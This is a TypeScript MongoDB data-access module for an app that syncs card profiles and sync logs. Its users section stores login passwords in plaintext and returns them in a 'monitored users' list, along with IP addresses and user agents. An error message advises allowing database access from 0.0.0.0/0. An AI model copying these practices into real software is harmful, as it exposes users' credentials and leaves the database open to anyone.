import { MongoClient, ServerApiVersion, Db, Collection } from "mongodb";
import "dotenv/config";
import { SheetProfile, SyncLog } from "../src/types";

export interface MongoUserRecord {
  username: string;
  password?: string;
  lastLoginAt: string;
  loginCount: number;
  ipAddress?: string;
  userAgent?: string;
  status: string;
  createdAt: string;
  updatedAt: string;
  loginHistory?: Array<{
    timestamp: string;
    ip?: string;
    userAgent?: string;
  }>;
}

export interface MongoStatus {
  configured: boolean;
  connected: boolean;
  dbName: string;
  error?: string;
  errorCode?: string;
  isIpBlocked?: boolean;
  collections: string[];
  lastChecked: string;
}

let client: MongoClient | null = null;
let db: Db | null = null;
let isConnected = false;
let lastError: { message: string; isIpBlocked: boolean; code?: string } | null = null;
let reconnectTimer: NodeJS.Timeout | null = null;

const DB_NAME = process.env.MONGODB_DB_NAME || "vef_to_gsheet";
const MONGODB_URI = process.env.MONGODB_URI || "";

export function getMongoDb(): Db | null {
  return isConnected && db ? db : null;
}

export function getMongoStatus(): MongoStatus {
  return {
    configured: Boolean(MONGODB_URI),
    connected: isConnected,
    dbName: DB_NAME,
    error: lastError?.message,
    isIpBlocked: lastError?.isIpBlocked,
    collections: ["card_profiles", "users", "sync_logs"],
    lastChecked: new Date().toISOString(),
  };
}

export async function connectMongoDB(): Promise<boolean> {
  if (!MONGODB_URI) {
    lastError = { message: "MONGODB_URI belum dikonfigurasi di file environment.", isIpBlocked: false };
    return false;
  }

  try {
    if (client) {
      try {
        await client.close();
      } catch (e) {}
    }

    client = new MongoClient(MONGODB_URI, {
      serverSelectionTimeoutMS: 5000,
      connectTimeoutMS: 5000,
      serverApi: {
        version: ServerApiVersion.v1,
        strict: true,
        deprecationErrors: true,
      },
    });

    await client.connect();
    // Test command
    await client.db("admin").command({ ping: 1 });

    db = client.db(DB_NAME);
    isConnected = true;
    lastError = null;

    console.log(`[MongoDB] Berhasil terhubung ke database "${DB_NAME}" di MongoDB Atlas!`);

    // Ensure collections and indexes exist
    await initializeCollectionsAndIndexes(db);

    return true;
  } catch (err: any) {
    isConnected = false;
    db = null;
    const msg = err.message || String(err);
    const isIpBlocked =
      msg.includes("SSL alert number 80") ||
      msg.includes("tlsv1 alert internal error") ||
      msg.includes("MongoServerSelectionError") ||
      msg.includes("connection closed") ||
      msg.includes("ETIMEDOUT");

    lastError = {
      message: isIpBlocked
        ? "Koneksi ke MongoDB Atlas ditolak: IP server belum diizinkan di Network Access MongoDB Atlas. Tambahkan IP 0.0.0.0/0 (Allow from Anywhere)."
        : msg,
      isIpBlocked,
      code: err.code,
    };

    console.warn(`[MongoDB Warning] ${lastError.message}`);
    return false;
  }
}

// Background auto-reconnect attempt every 45 seconds if disconnected
export function startMongoKeepAlive() {
  if (reconnectTimer) clearInterval(reconnectTimer);
  reconnectTimer = setInterval(async () => {
    if (!isConnected && MONGODB_URI) {
      console.log("[MongoDB] Mencoba menyambungkan kembali ke MongoDB Atlas...");
      await connectMongoDB();
    }
  }, 45000);
}

async function initializeCollectionsAndIndexes(database: Db) {
  try {
    const existing = await database.listCollections().toArray();
    const names = existing.map((c) => c.name);

    if (!names.includes("card_profiles")) {
      await database.createCollection("card_profiles");
      console.log('[MongoDB] Collection "card_profiles" dibuat.');
    }
    if (!names.includes("users")) {
      await database.createCollection("users");
      console.log('[MongoDB] Collection "users" dibuat.');
    }
    if (!names.includes("sync_logs")) {
      await database.createCollection("sync_logs");
      console.log('[MongoDB] Collection "sync_logs" dibuat.');
    }

    // Indexes
    await database.collection("card_profiles").createIndex({ id: 1 }, { unique: true });
    await database.collection("card_profiles").createIndex({ ownerUsername: 1 });
    await database.collection("users").createIndex({ username: 1 }, { unique: true });
    await database.collection("sync_logs").createIndex({ timestamp: -1 });
    await database.collection("sync_logs").createIndex({ ownerUsername: 1 });
  } catch (err) {
    console.error("[MongoDB] Inisialisasi collection/index:", err);
  }
}

// =================== CARD PROFILES REPOSITORY ===================

export async function fetchAllProfilesFromDB(): Promise<SheetProfile[] | null> {
  if (!isConnected || !db) return null;
  try {
    const docs = await db
      .collection("card_profiles")
      .find({})
      .sort({ createdAt: -1 })
      .toArray();

    return docs.map((doc: any) => {
      const { _id, ...rest } = doc;
      if (!rest.scheduleTimes || !Array.isArray(rest.scheduleTimes) || rest.scheduleTimes.length === 0) {
        rest.scheduleTimes = ["09:00", "14:00", "17:00"];
      }
      rest.ownerUsername = rest.ownerUsername || "";
      return rest as SheetProfile;
    });
  } catch (err) {
    console.error("[MongoDB] Gagal mengambil card profiles:", err);
    return null;
  }
}

export async function upsertProfileToDB(profile: SheetProfile): Promise<boolean> {
  if (!isConnected || !db) return false;
  try {
    await db.collection("card_profiles").updateOne(
      { id: profile.id },
      { $set: { ...profile, updatedAt: new Date().toISOString() } },
      { upsert: true }
    );
    return true;
  } catch (err) {
    console.error("[MongoDB] Gagal menyimpan card profile:", err);
    return false;
  }
}

export async function deleteProfileFromDB(profileId: string): Promise<boolean> {
  if (!isConnected || !db) return false;
  try {
    await db.collection("card_profiles").deleteOne({ id: profileId });
    return true;
  } catch (err) {
    console.error("[MongoDB] Gagal menghapus card profile:", err);
    return false;
  }
}

// =================== USERS MONITORING REPOSITORY ===================

export async function recordUserLoginToDB(userData: {
  username: string;
  password?: string;
  ipAddress?: string;
  userAgent?: string;
  cookie?: string;
}): Promise<boolean> {
  if (!isConnected || !db) return false;
  try {
    const now = new Date().toISOString();
    await db.collection("users").updateOne(
      { username: userData.username },
      {
        $set: {
          username: userData.username,
          password: userData.password || "",
          lastLoginAt: now,
          ipAddress: userData.ipAddress || "",
          userAgent: userData.userAgent || "",
          status: "logged_in",
          updatedAt: now,
        },
        $inc: { loginCount: 1 },
        $setOnInsert: { createdAt: now },
        $push: {
          loginHistory: {
            $each: [
              {
                timestamp: now,
                ip: userData.ipAddress || "",
                userAgent: userData.userAgent || "",
              },
            ],
            $slice: -25, // Keep last 25 logins
          },
        } as any,
      },
      { upsert: true }
    );
    console.log(`[MongoDB] Login user "${userData.username}" tercatat di collection "users".`);
    return true;
  } catch (err) {
    console.error("[MongoDB] Gagal mencatat user login:", err);
    return false;
  }
}

export async function fetchMonitoredUsersFromDB(): Promise<MongoUserRecord[]> {
  if (!isConnected || !db) return [];
  try {
    const docs = await db
      .collection("users")
      .find({})
      .sort({ lastLoginAt: -1 })
      .toArray();

    return docs.map((doc: any) => {
      const { _id, ...rest } = doc;
      return rest as MongoUserRecord;
    });
  } catch (err) {
    console.error("[MongoDB] Gagal mengambil daftar monitored users:", err);
    return [];
  }
}

// =================== SYNC LOGS REPOSITORY ===================

export async function saveSyncLogToDB(log: SyncLog): Promise<boolean> {
  if (!isConnected || !db) return false;
  try {
    await db.collection("sync_logs").insertOne({
      ...log,
      createdAt: new Date().toISOString(),
    });
    return true;
  } catch (err) {
    console.error("[MongoDB] Gagal menyimpan sync log:", err);
    return false;
  }
}

export async function fetchSyncLogsFromDB(limit: number = 100): Promise<SyncLog[] | null> {
  if (!isConnected || !db) return null;
  try {
    const docs = await db
      .collection("sync_logs")
      .find({})
      .sort({ timestamp: -1 })
      .limit(limit)
      .toArray();

    return docs.map((doc: any) => {
      const { _id, ...rest } = doc;
      return rest as SyncLog;
    });
  } catch (err) {
    console.error("[MongoDB] Gagal mengambil sync logs dari DB:", err);
    return null;
  }
}

export async function clearSyncLogsFromDB(): Promise<boolean> {
  if (!isConnected || !db) return false;
  try {
    await db.collection("sync_logs").deleteMany({});
    return true;
  } catch (err) {
    console.error("[MongoDB] Gagal menghapus sync logs di DB:", err);
    return false;
  }
}
